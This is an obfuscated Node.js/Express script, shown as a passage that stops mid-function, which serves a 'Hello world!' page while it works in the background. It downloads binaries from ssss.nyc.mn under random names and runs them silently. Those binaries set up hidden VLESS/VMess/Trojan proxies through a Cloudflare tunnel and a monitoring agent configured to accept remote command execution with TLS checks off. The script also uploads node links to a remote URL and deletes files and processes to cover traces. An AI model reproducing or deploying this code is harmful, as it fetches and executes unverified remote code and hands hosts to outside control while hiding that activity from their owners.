const _0x542c58=_0x5772;function _0x5314(){const _0x3c213e=['\x0a\x20\x20credentials-file:\x20','2096','env','NAME','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','http\x20server\x20is\x20running\x20on\x20port:','existsSync','765810uYfaof','tunnel.yml','platform','127.0.0.1','1594229QmIUkX','list.txt','length','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20is\x20running','clear','\x20-c\x20\x22','direct','ArgoDomain:','unlinkSync','random','unshift','/vmess-argo?ed=2560','1423855WTBvdn','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','post','forEach','145QcWiJv','npm\x20running\x20error:\x20','readFileSync','\x20-s\x20','NEZHA_PORT','express','/sub.txt\x20saved\x20successfully','filter','.exe\x20>\x20nul\x202>&1','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','https+local://8.8.8.8/dns-query','&path=%2Fvless-argo%3Fed%3D2560#','xtls-rprx-vision','win32','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','data','nohup\x20','stringify','--tls','includes','test','Content-Type','\x20already\x20exists','arch','join','https://arm64.ssss.nyc.mn/bot','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x20-p\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','NEZHA_KEY','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0a\x20\x20\x0avmess://','taskkill\x20/f\x20/im\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','false','tls','child_process','finish','mkdirSync','sub.txt','Error\x20executing\x20command:\x20','readdirSync','set','split','CFPORT','0e4fba22-4847-33f6-8d20-ba60cadafb6c','blackhole','/vmess-argo','\x22\x20>\x20/dev/null\x202>&1','/api/add-nodes','http','https://arm64.ssss.nyc.mn/v1','\x20>/dev/null\x202>&1','message','\x20failed:\x20','2083','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','error','abcdefghijklmnopqrstuvwxyz','send','\x20is\x20created','log','tcp','tunnel.json','arm64','has','/config.json\x20>/dev/null\x202>&1\x20&','\x0aclient_secret:\x20','ARGO_AUTH','2053','https://amd64.ssss.nyc.mn/bot','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','catch','floor','response','Empowerment\x20failed\x20for\x20','74388COihhB','trim','Hello\x20world!','vless','?encryption=none&security=tls&sni=','get','https://amd64.ssss.nyc.mn/web','UUID','fileUrl','Error\x20reading\x20boot.log:','del\x20/f\x20/q\x20','/trojan-argo','5347359eLrNkk','ARGO_DOMAIN:','utf-8','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','fileName','close','\x20>/dev/null\x202>&1\x20&','Download\x20','App\x20is\x20running','from','443','push','boot.log','basename','exec','ARGO_DOMAIN','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20-c\x20','application/json','freedom','createWriteStream','162.159.44.98','axios','aarch64','sub','statSync','base64','arm','?security=tls&sni=','writeFileSync','TunnelSecret','/api/add-subscriptions','Unhandled\x20error\x20in\x20startserver:','FILE_PATH','1422024vLhtVV','php\x20running\x20error:\x20','status','trojan','true','amd','Skipping\x20adding\x20automatic\x20access\x20task','SUB_PATH','9ATrAGN','UPLOAD_URL','./tmp','https://arm64.ssss.nyc.mn/web','/api/delete-nodes','chmod','\x0a\x20\x20tunnel:\x20','util','charAt','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','&fp=firefox&type=ws&host=','substring','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','8443','config.json','854176MoaShq','pop','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https://amd64.ssss.nyc.mn/agent','rm\x20-rf\x20','toString','path','Empowerment\x20success\x20for\x20','none','all','AUTO_ACCESS','block','NEZHA\x20variable\x20is\x20empty,skip\x20running','/dev/null','pkill\x20-f\x20\x22[','SERVER_PORT','automatic\x20access\x20task\x20added\x20successfully','\x20successfully','2087','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','match','30jjTuiV','then'];_0x5314=function(){return _0x3c213e;};return _0x5314();}(function(_0x5c1156,_0x4b8e61){const _0xe1863a={_0x49a288:0x201,_0x473ae1:0x251},_0x4faf46=_0x5772,_0x5b0c9f=_0x5c1156();while(!![]){try{const _0x270b46=parseInt(_0x4faf46(_0xe1863a._0x49a288))/0x1+-parseInt(_0x4faf46(0x1d2))/0x2+parseInt(_0x4faf46(0x198))/0x3+-parseInt(_0x4faf46(_0xe1863a._0x473ae1))/0x4*(parseInt(_0x4faf46(0x205))/0x5)+parseInt(_0x4faf46(0x1e7))/0x6*(-parseInt(_0x4faf46(0x1f4))/0x7)+-parseInt(_0x4faf46(0x1bb))/0x8+parseInt(_0x4faf46(0x1c3))/0x9*(parseInt(_0x4faf46(0x1f0))/0xa);if(_0x270b46===_0x4b8e61)break;else _0x5b0c9f['push'](_0x5b0c9f['shift']());}catch(_0x50a183){_0x5b0c9f['push'](_0x5b0c9f['shift']());}}}(_0x5314,0xf4240));const express=require(_0x542c58(0x20a)),app=express(),axios=require(_0x542c58(0x1af)),os=require('os'),fs=require('fs'),path=require(_0x542c58(0x1d8)),{promisify}=require(_0x542c58(0x1ca)),exec=promisify(require(_0x542c58(0x229))[_0x542c58(0x1a7)]),{execSync}=require(_0x542c58(0x229)),UPLOAD_URL=process[_0x542c58(0x1eb)][_0x542c58(0x1c4)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x542c58(0x1dc)]||![],FILE_PATH=process['env'][_0x542c58(0x1ba)]||_0x542c58(0x1c5),SUB_PATH=process[_0x542c58(0x1eb)][_0x542c58(0x1c2)]||_0x542c58(0x1b1),PORT=process['env'][_0x542c58(0x1e1)]||process[_0x542c58(0x1eb)]['PORT']||0xbb8,UUID=process[_0x542c58(0x1eb)][_0x542c58(0x258)]||_0x542c58(0x232),NEZHA_SERVER=process[_0x542c58(0x1eb)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x542c58(0x209)]||'',NEZHA_KEY=process['env'][_0x542c58(0x222)]||'',ARGO_DOMAIN=process['env'][_0x542c58(0x1a8)]||'',ARGO_AUTH=process['env'][_0x542c58(0x249)]||'',ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x542c58(0x1eb)]['CFIP']||_0x542c58(0x1ae),CFPORT=process[_0x542c58(0x1eb)][_0x542c58(0x231)]||0x1bb,NAME=process[_0x542c58(0x1eb)][_0x542c58(0x1ec)]||'temptunnel';!fs[_0x542c58(0x1ef)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x542c58(0x242)](FILE_PATH+_0x542c58(0x241))):console[_0x542c58(0x242)](FILE_PATH+_0x542c58(0x21b));function generateRandomName(){const _0x32ca43={_0x318385:0x1f6},_0x10a3a9=_0x542c58,_0x5a86df=_0x10a3a9(0x23f);let _0x3e5add='';for(let _0xcab70=0x0;_0xcab70<0x6;_0xcab70++){_0x3e5add+=_0x5a86df['charAt'](Math[_0x10a3a9(0x24e)](Math[_0x10a3a9(0x1fe)]()*_0x5a86df[_0x10a3a9(_0x32ca43._0x318385)]));}return _0x3e5add;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x542c58(0x21d)](FILE_PATH,npmName),phpPath=path[_0x542c58(0x21d)](FILE_PATH,phpName),webPath=path[_0x542c58(0x21d)](FILE_PATH,webName),botPath=path[_0x542c58(0x21d)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x542c58(0x22c)),listPath=path['join'](FILE_PATH,_0x542c58(0x1f5)),bootLogPath=path[_0x542c58(0x21d)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x542c58(0x1d1));function deleteNodes(){const _0x12c621={_0x29625c:0x1b3,_0x3da2e3:0x1d7,_0x31fc45:0x230,_0x3b739c:0x1f6,_0x2e22b5:0x1c7,_0x4fc97d:0x216},_0x3f8786=_0x542c58;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x223ce8;try{_0x223ce8=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x305c8b=Buffer[_0x3f8786(0x1a2)](_0x223ce8,_0x3f8786(_0x12c621._0x29625c))[_0x3f8786(_0x12c621._0x3da2e3)](_0x3f8786(0x19a)),_0x1ee0e5=_0x305c8b[_0x3f8786(_0x12c621._0x31fc45)]('\x0a')[_0x3f8786(0x20c)](_0x403998=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3f8786(0x219)](_0x403998));if(_0x1ee0e5[_0x3f8786(_0x12c621._0x3b739c)]===0x0)return;return axios['post'](UPLOAD_URL+_0x3f8786(_0x12c621._0x2e22b5),JSON[_0x3f8786(_0x12c621._0x4fc97d)]({'nodes':_0x1ee0e5}),{'headers':{'Content-Type':'application/json'}})[_0x3f8786(0x24d)](_0x4fe8cc=>{return null;}),null;}catch(_0x55b7b0){return null;}}function cleanupOldFiles(){const _0x386412={_0x5a3c51:0x22e},_0x2c0a7f={_0xb212cd:0x21d},_0x192a17=_0x542c58;try{const _0x2d6cb7=fs[_0x192a17(_0x386412._0x5a3c51)](FILE_PATH);_0x2d6cb7['forEach'](_0x5c04b7=>{const _0x34fceb=_0x192a17,_0x51c31b=path[_0x34fceb(_0x2c0a7f._0xb212cd)](FILE_PATH,_0x5c04b7);try{const _0x57320f=fs[_0x34fceb(0x1b2)](_0x51c31b);_0x57320f['isFile']()&&fs[_0x34fceb(0x1fd)](_0x51c31b);}catch(_0x58756c){}});}catch(_0x3fa847){}}app[_0x542c58(0x256)]('/',function(_0x1c50fe,_0x42a523){const _0x4a1b6d={_0x1f16b6:0x253},_0x54acb9=_0x542c58;_0x42a523['send'](_0x54acb9(_0x4a1b6d._0x1f16b6));});async function generateConfig(){const _0x565f68={_0x3a8331:0x254,_0x42f762:0x211,_0x131d95:0x1da,_0x5a1b82:0x234,_0x4aab58:0x25c,_0x44cb15:0x254,_0x1e9ba1:0x1f3,_0x2b80dd:0x237,_0x247a04:0x237,_0x50fbea:0x1f3,_0x588ab9:0x228,_0x35c1d0:0x1ac,_0x8bd113:0x1fb,_0x57b469:0x21d},_0x1cb30e=_0x542c58,_0x52cc9d={'log':{'access':_0x1cb30e(0x1df),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1cb30e(_0x565f68._0x3a8331),'settings':{'clients':[{'id':UUID,'flow':_0x1cb30e(_0x565f68._0x42f762)}],'decryption':_0x1cb30e(_0x565f68._0x131d95),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x1cb30e(_0x565f68._0x5a1b82),'dest':0xbbb},{'path':_0x1cb30e(_0x565f68._0x4aab58),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x1cb30e(0x1f3),'protocol':_0x1cb30e(_0x565f68._0x44cb15),'settings':{'clients':[{'id':UUID}],'decryption':_0x1cb30e(0x1da)},'streamSettings':{'network':_0x1cb30e(0x243),'security':_0x1cb30e(0x1da)}},{'port':0xbba,'listen':_0x1cb30e(_0x565f68._0x1e9ba1),'protocol':_0x1cb30e(_0x565f68._0x44cb15),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1cb30e(0x1da)},'streamSettings':{'network':'ws','security':_0x1cb30e(_0x565f68._0x131d95),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1cb30e(_0x565f68._0x2b80dd),_0x1cb30e(0x228),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1cb30e(_0x565f68._0x247a04),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1cb30e(_0x565f68._0x50fbea),'protocol':_0x1cb30e(0x1be),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1cb30e(0x1da),'wsSettings':{'path':_0x1cb30e(_0x565f68._0x4aab58)}},'sniffing':{'enabled':!![],'destOverride':[_0x1cb30e(_0x565f68._0x247a04),_0x1cb30e(_0x565f68._0x588ab9),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x1cb30e(0x20f)]},'outbounds':[{'protocol':_0x1cb30e(_0x565f68._0x35c1d0),'tag':_0x1cb30e(_0x565f68._0x8bd113)},{'protocol':_0x1cb30e(0x233),'tag':_0x1cb30e(0x1dd)}]};fs[_0x1cb30e(0x1b6)](path[_0x1cb30e(_0x565f68._0x57b469)](FILE_PATH,_0x1cb30e(0x1d1)),JSON['stringify'](_0x52cc9d,null,0x2));}function getSystemArchitecture(){const _0x436d58={_0x519f47:0x21c,_0x4bd0f6:0x1b4,_0x45294b:0x245,_0x3fd5b5:0x1b0},_0x1b6ca3=_0x542c58,_0x3d992c=os[_0x1b6ca3(_0x436d58._0x519f47)]();return _0x3d992c===_0x1b6ca3(_0x436d58._0x4bd0f6)||_0x3d992c===_0x1b6ca3(_0x436d58._0x45294b)||_0x3d992c===_0x1b6ca3(_0x436d58._0x3fd5b5)?_0x1b6ca3(0x1b4):_0x1b6ca3(0x1c0);}function downloadFile(_0xaad612,_0x343dd9,_0x2fdfa2){const _0x47f85c={_0x3670a6:0x1ef,_0x153def:0x1ad,_0x42e987:0x1e8,_0x1de5b0:0x24d},_0x357437={_0x4217b3:0x23a,_0x357d86:0x23e},_0x54d466={_0x155aa4:0x214,_0x6d26bc:0x23e},_0x1cce58=_0x542c58,_0x12cecd=_0xaad612;!fs[_0x1cce58(_0x47f85c._0x3670a6)](FILE_PATH)&&fs[_0x1cce58(0x22b)](FILE_PATH,{'recursive':!![]});const _0x246489=fs[_0x1cce58(_0x47f85c._0x153def)](_0x12cecd);axios({'method':'get','url':_0x343dd9,'responseType':'stream'})[_0x1cce58(_0x47f85c._0x42e987)](_0x622677=>{const _0x276b9a={_0x2bf5f3:0x19e},_0x2f0d1c=_0x1cce58;_0x622677[_0x2f0d1c(_0x54d466._0x155aa4)]['pipe'](_0x246489),_0x246489['on'](_0x2f0d1c(0x22a),()=>{const _0x17735a=_0x2f0d1c;_0x246489[_0x17735a(_0x276b9a._0x2bf5f3)](),console['log']('Download\x20'+path[_0x17735a(0x1a6)](_0x12cecd)+_0x17735a(0x1e3)),_0x2fdfa2(null,_0x12cecd);}),_0x246489['on'](_0x2f0d1c(_0x54d466._0x6d26bc),_0x466c6f=>{const _0x4ad89a=_0x2f0d1c;fs['unlink'](_0x12cecd,()=>{});const _0x48f097='Download\x20'+path[_0x4ad89a(0x1a6)](_0x12cecd)+_0x4ad89a(0x23b)+_0x466c6f[_0x4ad89a(0x23a)];console['error'](_0x48f097),_0x2fdfa2(_0x48f097);});})[_0x1cce58(_0x47f85c._0x1de5b0)](_0x5440be=>{const _0xfc1a43=_0x1cce58,_0xc6626b=_0xfc1a43(0x1a0)+path['basename'](_0x12cecd)+'\x20failed:\x20'+_0x5440be[_0xfc1a43(_0x357437._0x4217b3)];console[_0xfc1a43(_0x357437._0x357d86)](_0xc6626b),_0x2fdfa2(_0xc6626b);});}async function downloadFilesAndRun(){const _0x4742ca={_0x5e7c2b:0x1f6,_0x20c846:0x202,_0x59432a:0x1db,_0x23b7b4:0x218,_0x53c22c:0x1ea,_0x6abd53:0x246,_0x221aea:0x227,_0x1cb49a:0x248,_0x5284d8:0x1ed,_0x1e6c2d:0x1cc,_0x1a6fef:0x1b6,_0x335132:0x21d,_0x2b6b4b:0x1f7,_0x7279d0:0x1f8,_0x1ed854:0x1bc,_0x8c6ee5:0x1a3,_0x4352f1:0x1d0,_0x1213ff:0x1e4,_0x5532f8:0x23c,_0x5c757b:0x217,_0x5dcf71:0x1f8,_0x1d36f6:0x1e6,_0x593f3a:0x24c,_0x1b24a0:0x215,_0x1834c0:0x19f,_0x5a4385:0x242,_0x12de47:0x23e},_0x42a8d6={_0x399904:0x1ef,_0x3c3c3e:0x1c8},_0x326c4a=_0x542c58,_0x58812e=getSystemArchitecture(),_0x2248b7=getFilesForArchitecture(_0x58812e);if(_0x2248b7[_0x326c4a(_0x4742ca._0x5e7c2b)]===0x0){console['log'](_0x326c4a(_0x4742ca._0x20c846));return;}const _0xdec3ea=_0x2248b7['map'](_0x936e4b=>{const _0x48ab7c={_0x32aa1e:0x259};return new Promise((_0x444c94,_0x8d10c9)=>{const _0x3750b4=_0x5772;downloadFile(_0x936e4b[_0x3750b4(0x19d)],_0x936e4b[_0x3750b4(_0x48ab7c._0x32aa1e)],(_0x5e407d,_0x389da0)=>{_0x5e407d?_0x8d10c9(_0x5e407d):_0x444c94(_0x389da0);});});});try{await Promise[_0x326c4a(_0x4742ca._0x59432a)](_0xdec3ea);}catch(_0x10382d){console['error']('Error\x20downloading\x20files:',_0x10382d);return;}function _0x42ce1e(_0x13f14f){const _0x106b25=0x1fd;_0x13f14f['forEach'](_0x166a02=>{const _0x73a7f3={_0x3880ff:0x242,_0x4eb83a:0x1d9},_0x1c01e2=_0x5772;fs[_0x1c01e2(_0x42a8d6._0x399904)](_0x166a02)&&fs[_0x1c01e2(_0x42a8d6._0x3c3c3e)](_0x166a02,_0x106b25,_0x15dabb=>{const _0x2d8b0c=_0x1c01e2;_0x15dabb?console[_0x2d8b0c(0x23e)](_0x2d8b0c(0x250)+_0x166a02+':\x20'+_0x15dabb):console[_0x2d8b0c(_0x73a7f3._0x3880ff)](_0x2d8b0c(_0x73a7f3._0x4eb83a)+_0x166a02+':\x20'+_0x106b25[_0x2d8b0c(0x1d7)](0x8));});});}const _0x49434b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x42ce1e(_0x49434b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4375b0=NEZHA_SERVER[_0x326c4a(_0x4742ca._0x23b7b4)](':')?NEZHA_SERVER[_0x326c4a(0x230)](':')[_0x326c4a(0x1d3)]():'',_0x1abf20=new Set(['443',_0x326c4a(0x1d0),_0x326c4a(_0x4742ca._0x53c22c),_0x326c4a(0x1e4),'2083','2053']),_0x1510ae=_0x1abf20[_0x326c4a(_0x4742ca._0x6abd53)](_0x4375b0)?_0x326c4a(0x1bf):_0x326c4a(_0x4742ca._0x221aea),_0x5b4ffc=_0x326c4a(_0x4742ca._0x1cb49a)+NEZHA_KEY+_0x326c4a(_0x4742ca._0x5284d8)+NEZHA_SERVER+_0x326c4a(_0x4742ca._0x1e6c2d)+_0x1510ae+_0x326c4a(0x19b)+UUID;fs[_0x326c4a(_0x4742ca._0x1a6fef)](path[_0x326c4a(_0x4742ca._0x335132)](FILE_PATH,'config.yaml'),_0x5b4ffc);const _0x5d7919=_0x326c4a(0x215)+phpPath+_0x326c4a(0x1fa)+FILE_PATH+_0x326c4a(_0x4742ca._0x2b6b4b);try{await exec(_0x5d7919),console['log'](phpName+_0x326c4a(_0x4742ca._0x7279d0)),await new Promise(_0x3fbe4c=>setTimeout(_0x3fbe4c,0x3e8));}catch(_0x19877d){console['error'](_0x326c4a(_0x4742ca._0x1ed854)+_0x19877d);}}else{let _0x3bdb43='';const _0x1f6d96=[_0x326c4a(_0x4742ca._0x8c6ee5),_0x326c4a(_0x4742ca._0x4352f1),_0x326c4a(0x1ea),_0x326c4a(_0x4742ca._0x1213ff),_0x326c4a(_0x4742ca._0x5532f8),_0x326c4a(0x24a)];_0x1f6d96['includes'](NEZHA_PORT)&&(_0x3bdb43=_0x326c4a(_0x4742ca._0x5c757b));const _0x3b5721='nohup\x20'+npmPath+_0x326c4a(0x208)+NEZHA_SERVER+':'+NEZHA_PORT+_0x326c4a(0x220)+NEZHA_KEY+'\x20'+_0x3bdb43+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3b5721),console[_0x326c4a(0x242)](npmName+_0x326c4a(0x1f8)),await new Promise(_0x5970d3=>setTimeout(_0x5970d3,0x3e8));}catch(_0x604cec){console['error'](_0x326c4a(0x206)+_0x604cec);}}}else console[_0x326c4a(0x242)](_0x326c4a(0x1de));const _0x38f4ff=_0x326c4a(0x215)+webPath+_0x326c4a(0x1aa)+FILE_PATH+_0x326c4a(0x247);try{await exec(_0x38f4ff),console['log'](webName+_0x326c4a(_0x4742ca._0x5dcf71)),await new Promise(_0x4c62d6=>setTimeout(_0x4c62d6,0x3e8));}catch(_0x276356){console['error']('web\x20running\x20error:\x20'+_0x276356);}if(fs['existsSync'](botPath)){let _0x53fa13;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x53fa13=_0x326c4a(0x23d)+ARGO_AUTH;else ARGO_AUTH[_0x326c4a(_0x4742ca._0x1d36f6)](/TunnelSecret/)?_0x53fa13=_0x326c4a(0x1a9)+FILE_PATH+'/tunnel.yml\x20run':_0x53fa13='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x326c4a(_0x4742ca._0x593f3a)+ARGO_PORT;try{await exec(_0x326c4a(_0x4742ca._0x1b24a0)+botPath+'\x20'+_0x53fa13+_0x326c4a(_0x4742ca._0x1834c0)),console[_0x326c4a(_0x4742ca._0x5a4385)](botName+_0x326c4a(_0x4742ca._0x5dcf71)),await new Promise(_0x18e2f6=>setTimeout(_0x18e2f6,0x7d0));}catch(_0x3edecd){console[_0x326c4a(_0x4742ca._0x12de47)](_0x326c4a(0x22d)+_0x3edecd);}}await new Promise(_0x5e75fe=>setTimeout(_0x5e75fe,0x1388));}function getFilesForArchitecture(_0x2878e5){const _0x5244a0={_0x19d27b:0x1b4,_0x22e8a1:0x1c6,_0x59d313:0x21e,_0x361646:0x257,_0x489ca3:0x1ff,_0x5cac87:0x1b4},_0x36a4c8=_0x542c58;let _0x2386bc;_0x2878e5===_0x36a4c8(_0x5244a0._0x19d27b)?_0x2386bc=[{'fileName':webPath,'fileUrl':_0x36a4c8(_0x5244a0._0x22e8a1)},{'fileName':botPath,'fileUrl':_0x36a4c8(_0x5244a0._0x59d313)}]:_0x2386bc=[{'fileName':webPath,'fileUrl':_0x36a4c8(_0x5244a0._0x361646)},{'fileName':botPath,'fileUrl':_0x36a4c8(0x24b)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x419540=_0x2878e5===_0x36a4c8(_0x5244a0._0x19d27b)?'https://arm64.ssss.nyc.mn/agent':_0x36a4c8(0x1d5);_0x2386bc[_0x36a4c8(_0x5244a0._0x489ca3)]({'fileName':npmPath,'fileUrl':_0x419540});}else{const _0x5dc4a3=_0x2878e5===_0x36a4c8(_0x5244a0._0x5cac87)?_0x36a4c8(0x238):'https://amd64.ssss.nyc.mn/v1';_0x2386bc[_0x36a4c8(0x1ff)]({'fileName':phpPath,'fileUrl':_0x5dc4a3});}}return _0x2386bc;}function argoType(){const _0x238c7b={_0x253441:0x21d,_0x2d8612:0x1c9,_0xf10558:0x1e9,_0x5447f5:0x21d,_0x18315c:0x244,_0x16ee46:0x21f,_0x4ef07d:0x223,_0x3076e9:0x1b6,_0x4382fb:0x1f1,_0x134d2f:0x242,_0x4c61fc:0x1cf},_0x50c649=_0x542c58;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x50c649(0x242)](_0x50c649(0x221));return;}if(ARGO_AUTH['includes'](_0x50c649(0x1b7))){fs['writeFileSync'](path[_0x50c649(_0x238c7b._0x253441)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x809a67=_0x50c649(_0x238c7b._0x2d8612)+ARGO_AUTH['split']('\x22')[0xb]+_0x50c649(_0x238c7b._0xf10558)+path[_0x50c649(_0x238c7b._0x5447f5)](FILE_PATH,_0x50c649(_0x238c7b._0x18315c))+_0x50c649(_0x238c7b._0x16ee46)+ARGO_DOMAIN+_0x50c649(_0x238c7b._0x4ef07d)+ARGO_PORT+_0x50c649(0x213);fs[_0x50c649(_0x238c7b._0x3076e9)](path[_0x50c649(0x21d)](FILE_PATH,_0x50c649(_0x238c7b._0x4382fb)),_0x809a67);}else console[_0x50c649(_0x238c7b._0x134d2f)](_0x50c649(_0x238c7b._0x4c61fc));}argoType();async function extractDomains(){const _0x1837c5={_0x5524ea:0x199,_0x3a1dbe:0x21d,_0x266203:0x1a5,_0x8e9442:0x19a,_0x385440:0x242,_0x4c9dee:0x1fc,_0x218b65:0x21d,_0x37c09c:0x24c,_0x29e67d:0x215,_0x39b842:0x19f,_0x6ae71:0x23e},_0x44b13d={_0x1175c3:0x1e5},_0x54d904={_0x47e1b1:0x1f2,_0x5b7197:0x20d,_0x411204:0x1e0},_0x2f18b4={_0x5ca138:0x1a4},_0x284e69=_0x542c58;let _0x343307;if(ARGO_AUTH&&ARGO_DOMAIN)_0x343307=ARGO_DOMAIN,console[_0x284e69(0x242)](_0x284e69(_0x1837c5._0x5524ea),_0x343307),await _0x575f23(_0x343307);else try{const _0x4276e8=fs['readFileSync'](path[_0x284e69(_0x1837c5._0x3a1dbe)](FILE_PATH,_0x284e69(_0x1837c5._0x266203)),_0x284e69(_0x1837c5._0x8e9442)),_0x460a03=_0x4276e8[_0x284e69(0x230)]('\x0a'),_0x355124=[];_0x460a03[_0x284e69(0x204)](_0xe4ebd9=>{const _0x4492de=_0x284e69,_0x5d6a95=_0xe4ebd9[_0x4492de(0x1e6)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5d6a95){const _0x5cde90=_0x5d6a95[0x1];_0x355124[_0x4492de(_0x2f18b4._0x5ca138)](_0x5cde90);}});if(_0x355124[_0x284e69(0x1f6)]>0x0)_0x343307=_0x355124[0x0],console[_0x284e69(_0x1837c5._0x385440)](_0x284e69(_0x1837c5._0x4c9dee),_0x343307),await _0x575f23(_0x343307);else{console[_0x284e69(_0x1837c5._0x385440)](_0x284e69(0x20e)),fs[_0x284e69(0x1fd)](path[_0x284e69(_0x1837c5._0x218b65)](FILE_PATH,_0x284e69(_0x1837c5._0x266203)));async function _0x343a4e(){const _0x507d2b=_0x284e69;try{process[_0x507d2b(_0x54d904._0x47e1b1)]===_0x507d2b(0x212)?await exec(_0x507d2b(0x225)+botName+_0x507d2b(_0x54d904._0x5b7197)):await exec(_0x507d2b(_0x54d904._0x411204)+botName[_0x507d2b(0x1cb)](0x0)+']'+botName[_0x507d2b(0x1ce)](0x1)+_0x507d2b(0x235));}catch(_0x5ccfca){}}_0x343a4e(),await new Promise(_0x5370e1=>setTimeout(_0x5370e1,0xbb8));const _0x4be126=_0x284e69(0x1d4)+FILE_PATH+_0x284e69(_0x1837c5._0x37c09c)+ARGO_PORT;try{await exec(_0x284e69(_0x1837c5._0x29e67d)+botPath+'\x20'+_0x4be126+_0x284e69(_0x1837c5._0x39b842)),console['log'](botName+_0x284e69(0x1f8)),await new Promise(_0x3f65a6=>setTimeout(_0x3f65a6,0xbb8)),await extractDomains();}catch(_0x353c6d){console['error']('Error\x20executing\x20command:\x20'+_0x353c6d);}}}catch(_0x4981e5){console[_0x284e69(_0x1837c5._0x6ae71)](_0x284e69(0x25a),_0x4981e5);}async function _0x575f23(_0x206508){const _0x32a88f={_0x2a8549:0x1da,_0x401b67:0x228,_0x51b708:0x210,_0x3ff3e3:0x224,_0x53cfca:0x1b3,_0x54bba8:0x19c,_0x589478:0x1a2,_0x4bef9a:0x1d7,_0x19c00b:0x256},_0x48d9a0=_0x284e69,_0x5e6c69=execSync(_0x48d9a0(_0x44b13d._0x1175c3),{'encoding':'utf-8'}),_0x57b6e1=_0x5e6c69[_0x48d9a0(0x252)](),_0x4f03c=NAME?NAME+'-'+_0x57b6e1:_0x57b6e1;return new Promise(_0xadf2e1=>{setTimeout(()=>{const 